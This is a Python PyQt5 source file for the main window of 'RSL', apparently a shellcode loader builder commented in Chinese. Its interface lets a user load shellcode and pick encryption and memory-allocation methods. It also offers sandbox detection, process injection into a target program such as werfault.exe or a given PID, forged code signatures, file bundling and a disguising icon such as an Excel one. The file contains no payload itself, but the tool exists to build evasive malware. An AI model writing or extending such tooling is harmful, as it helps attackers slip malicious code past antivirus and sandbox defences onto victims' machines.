"""
主窗口模块
定义RSL加载器的主界面
"""
import os
from PyQt5.QtCore import QSize
from PyQt5.QtWidgets import (
    QWidget, QPushButton, QTextEdit, QLineEdit,
    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox
)
from PyQt5.QtGui import QIcon, QMovie

from .widgets import BinComboBox, IcoComboBox
from .sign import SignAppComboBox
from .worker import WorkerThread
from .styles import get_main_stylesheet
from .config_manager import load_plugins_manifest, get_default_value
from .ui_components import (
    get_folder_icon,
    create_encryption_combobox,
    create_mem_mode_combobox,
    create_vm_checks_grid,
    create_run_mode_combobox,
    create_target_combobox
)
class LoaderGUI(QWidget):
    """RSL加载器主窗口"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle('RSL')
        self.setMinimumWidth(650)
        self.setWindowIcon(QIcon(os.path.join('gui', 'icons', 'icon.ico')))
        self.setStyleSheet(get_main_stylesheet())
        self.init_ui()
    
    def log_append(self, text):
        """向日志区域追加文本"""
        self.log.append(text)
        self.log.ensureCursorVisible()

    def init_ui(self):
        """初始化用户界面"""
        layout = QVBoxLayout()
        layout.setSpacing(16)
        folder_icon = get_folder_icon()
        
        # 1. 输入shellcode（下拉+按钮）
        layout.addWidget(self._create_bin_group(folder_icon))
        
        # 2. 加密方式
        layout.addWidget(self._create_encryption_group())
        
        # 3. 图标选择（下拉+按钮）
        layout.addWidget(self._create_icon_group(folder_icon))
        
        # 4. 内存分配方式
        layout.addWidget(self._create_mem_mode_group())
        
        # 5. VM检测
        layout.addWidget(self._create_vm_checks_group())
        
        # 6. 运行方式
        layout.addWidget(self._create_run_mode_group())
        
        # 7. 伪造签名
        layout.addWidget(self._create_sign_group(folder_icon))
        
        # 8. 进度条
        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout.addWidget(self.progress)
        
        # 9. 日志输出 & 10. 生成按钮
        layout.addLayout(self._create_bottom_layout())
        
        self.setLayout(layout)
        
        # 初始化加载动画
        self.loading_movie = QMovie(os.path.join('gui', 'icons', 'loading.gif'))
        self.loading_movie.setScaledSize(QSize(100, 100))
        self.loading_movie.frameChanged.connect(self.update_loading_icon)
    
    def _create_bin_group(self, folder_icon):
        """创建shellcode输入组"""
        bin_group = QGroupBox('Shellcode')
        bin_layout = QHBoxLayout()
        self.bin_box = BinComboBox()
        bin_btn = QPushButton(folder_icon, '')
        bin_btn.setToolTip('选择shellcode文件')
        bin_btn.setFixedWidth(32)
        bin_btn.clicked.connect(lambda: self.bin_box.choose_file(self))
        bin_layout.addWidget(self.bin_box)
        bin_layout.addWidget(bin_btn)
        bin_group.setLayout(bin_layout)
        return bin_group
    
    def _create_encryption_group(self):
        """创建加密方式组"""
        enc_group = QGroupBox('加密方式')
        enc_layout = QHBoxLayout()
        self.enc_box = create_encryption_combobox()
        enc_layout.addWidget(self.enc_box)
        enc_group.setLayout(enc_layout)
        return enc_group
    
    def _create_icon_group(self, folder_icon):
        """创建图标选择组"""
        ico_group = QGroupBox('图标文件')
        ico_layout = QHBoxLayout()
        self.ico_box = IcoComboBox()
        ico_btn = QPushButton(folder_icon, '')
        ico_btn.setToolTip('选择图标文件')
        ico_btn.setFixedWidth(32)
        ico_btn.clicked.connect(lambda: self.ico_box.choose_file(self))
        ico_layout.addWidget(self.ico_box)
        ico_layout.addWidget(ico_btn)
        ico_group.setLayout(ico_layout)
        return ico_group
    
    def _create_mem_mode_group(self):
        """创建内存分配方式组"""
        mem_group = QGroupBox('内存分配方式')
        mem_layout = QHBoxLayout()
        self.mem_mode_box = create_mem_mode_combobox()
        mem_layout.addWidget(self.mem_mode_box)
        mem_group.setLayout(mem_layout)
        return mem_group
    
    def _create_vm_checks_group(self):
        """创建VM检测组"""
        vm_group = QGroupBox('Sandbox 检测')
        vm_layout = QVBoxLayout()
        self.vm_checks_group = QGroupBox('')
        self.vm_checks_group.setVisible(True)
        grid, self.vm_checkboxes = create_vm_checks_grid()
        self.vm_checks_group.setLayout(grid)
        vm_layout.addWidget(self.vm_checks_group)
        vm_group.setLayout(vm_layout)
        return vm_group
    
    def _create_run_mode_group(self):
        """创建运行方式组"""
        run_group = QGroupBox('运行方式')
        run_layout = QVBoxLayout()
        self.run_mode_box = create_run_mode_combobox()
        self.run_mode_box.currentIndexChanged.connect(self.on_run_mode_changed)
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("输入目标程序路径 (如: C:/Windows/System32/notepad.exe)")
        self.target_input.setText(r"C:/Windows/System32/werfault.exe")  # 设置默认值
        self.target_input.hide()  # 默认隐藏
        self.pid_input = QLineEdit()
        self.pid_input.setPlaceholderText("输入目标进程ID (如: 1234)")
        self.pid_input.setText("0")  # 设置默认值
        self.pid_input.hide()  # 默认隐藏
        run_layout.addWidget(self.run_mode_box)
        run_layout.addWidget(self.target_input)
        run_layout.addWidget(self.pid_input)
        run_group.setLayout(run_layout)
        return run_group
    
    def _create_sign_group(self, folder_icon):
        """创建伪造签名组"""
        sign_group = QGroupBox('伪造签名')
        sign_layout = QHBoxLayout()
        self.sign_app_box = SignAppComboBox()
        self.sign_choose_btn = QPushButton(folder_icon, '')
        self.sign_choose_btn.setToolTip('选择被伪造应用')
        self.sign_choose_btn.setFixedWidth(32)
        self.sign_choose_btn.clicked.connect(lambda: self.sign_app_box.choose_file(self))
        self.sign_enable_box = QCheckBox('启用签名')
        self.forgery_enable_box = QCheckBox('文件捆绑')
        sign_layout.addWidget(self.sign_app_box)
        sign_layout.addWidget(self.sign_choose_btn)
        sign_layout.addWidget(self.sign_enable_box)
        sign_layout.addWidget(self.forgery_enable_box)
        sign_layout.setStretch(0, 1)
        sign_layout.setStretch(1, 0)
        sign_layout.setStretch(2, 0)
        sign_layout.setStretch(3, 0)
        sign_group.setLayout(sign_layout)
        return sign_group
    
    def _create_bottom_layout(self):
        """创建底部布局（日志输出和生成按钮）"""
        bottom_layout = QHBoxLayout()
        
        # 日志输出
        log_group = QGroupBox('📋 日志输出')
        log_layout = QVBoxLayout()
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        log_layout.addWidget(self.log)
        log_group.setLayout(log_layout)
        
        # 右侧布局：编译目标 + 生成按钮
        right_layout = QVBoxLayout()
        
        fixed_height = 230
        
        # 编译目标选择
        self.target_box = create_target_combobox()
        self.target_box.setFixedWidth(fixed_height)
        
        # Win7 兼容勾选框
        self.win7_checkbox = QCheckBox("Win7 兼容")
        self.win7_checkbox.setChecked(False)  # 默认非win7
        
        self.gen_btn = QPushButton(QIcon(os.path.join('gui', 'icons', 'rocket.ico')), '')
        self.gen_btn.setIconSize(QSize(100, 100))
        self.gen_btn.setFixedSize(fixed_height, fixed_height)
        
        right_layout.addWidget(self.win7_checkbox)
        right_layout.addWidget(self.target_box)
        right_layout.addWidget(self.gen_btn)
        
        self.gen_btn.clicked.connect(self.run_all)
        
        bottom_layout.addWidget(log_group)
        bottom_layout.addLayout(right_layout)
        
        return bottom_layout

    def update_loading_icon(self):
        """更新加载动画图标"""
        self.gen_btn.setIcon(QIcon(self.loading_movie.currentPixmap()))

    def start_loading_anim(self):
        """开始加载动画"""
        self.original_icon = self.gen_btn.icon()
        self.loading_movie.start()

    def stop_loading_anim(self):
        """停止加载动画"""
        self.loading_movie.stop()
        self.gen_btn.setIcon(self.original_icon)

    def run_all(self):
        """收集参数并启动构建任务"""
        self.gen_btn.setEnabled(False)
        self.start_loading_anim()
        
        # 收集所有参数
        params = self._collect_params()
        
        # 创建并启动工作线程
        self.worker = WorkerThread(self, params)
        self.worker.log_signal.connect(self.log_append)
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.done_signal.connect(self.on_gen_done)
        self.worker.error_signal.connect(self.on_gen_error)
        self.worker.start()
    
    def _collect_params(self):
        """收集所有构建参数"""
        input_bin = self.bin_box.itemData(self.bin_box.currentIndex())
        if not input_bin:
            input_bin = 'calc.bin'
        
        run_mode = self.run_mode_box.itemData(self.run_mode_box.currentIndex()) or 'enum_ui'
        
        selected_ids = [cb.property('vm_id') for cb in self.vm_checkboxes if cb.isChecked()]
        selected_ids = [sid for sid in selected_ids if isinstance(sid, str) and sid]
        vm_checks = ','.join(selected_ids)
        
        enc_method = self.enc_box.itemData(self.enc_box.currentIndex()) or self.enc_box.currentText()
        
        icon_path = self.ico_box.itemData(self.ico_box.currentIndex())
        if not icon_path:
            icon_path = os.path.join('icons', 'excel.ico')
        
        sign_enable = self.sign_enable_box.isChecked()
        sign_app = self.sign_app_box.itemData(self.sign_app_box.currentIndex())
        forgery_enable = self.forgery_enable_box.isChecked()
        
        mem_mode = self.mem_mode_box.itemData(self.mem_mode_box.currentIndex())
        if not mem_mode:
            mem_mode = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
        
        target = self.target_box.itemData(self.target_box.currentIndex())
        if not target:
            target = self.target_box.currentText()
        
        target_program = self.target_input.text().strip() if self.target_input.isVisible() else ""
        
        target_pid = self.pid_input.text().strip() if self.pid_input.isVisible() else "0"
        
        return {
            'input_bin': input_bin,
            'run_mode': run_mode,
            'vm_checks': vm_checks,
            'enc_method': enc_method,
            'icon_path': icon_path,
            'sign_enable': sign_enable,
            'sign_app': sign_app,
            'forgery_enable': forgery_enable,
            'mem_mode': mem_mode,
            'target': target,
            'target_program': target_program,
            'target_pid': target_pid,
            'win7_compat': self.win7_checkbox.isChecked()
        }
    
    def on_gen_error(self, msg):
        """处理构建错误"""
        self.stop_loading_anim()
        self.gen_btn.setEnabled(True)
        self.progress.setValue(0)
        self.log_append('[错误] ' + msg)
        QMessageBox.critical(self, '错误', msg)

    def on_run_mode_changed(self):
        """运行方式改变时显示/隐藏输入框"""
        manifest = load_plugins_manifest()
        run_modes = manifest.get('run_modes', [])
        run_mode_id = self.run_mode_box.itemData(self.run_mode_box.currentIndex())
        for rm in run_modes:
            if rm['id'] == run_mode_id:
                pattern = rm.get('pattern', 1)
                if pattern == 2:
                    self.target_input.show()
                    self.pid_input.hide()
                elif pattern == 3:
                    self.target_input.hide()
                    self.pid_input.show()
                else:
                    self.target_input.hide()
                    self.pid_input.hide()
                break

    def on_gen_done(self, dst_file):
        """处理构建完成"""
        self.stop_loading_anim()
        self.progress.setValue(100)
        self.gen_btn.setEnabled(True)
        QMessageBox.information(self, '完成', f'生成成功: {dst_file}')